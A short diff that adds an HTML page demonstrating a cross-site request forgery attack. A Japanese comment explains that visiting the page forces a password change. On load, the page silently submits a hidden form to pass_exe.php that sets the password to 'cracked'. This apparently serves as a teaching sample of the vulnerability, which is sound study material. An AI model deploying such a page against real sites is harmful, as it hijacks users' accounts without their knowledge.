@@ -1,0 +1,7 @@
+<!-- このページにアクセスをした瞬間パスワード実行画面に飛んでしまい、パスワードを書き換えられてしまう -->
+
+<body onload="document.forms[0].submit()">
+<form action="pass_exe.php" method="POST">
+<input type="hidden" name="pwd" value="cracked">
+</form>
+</body>
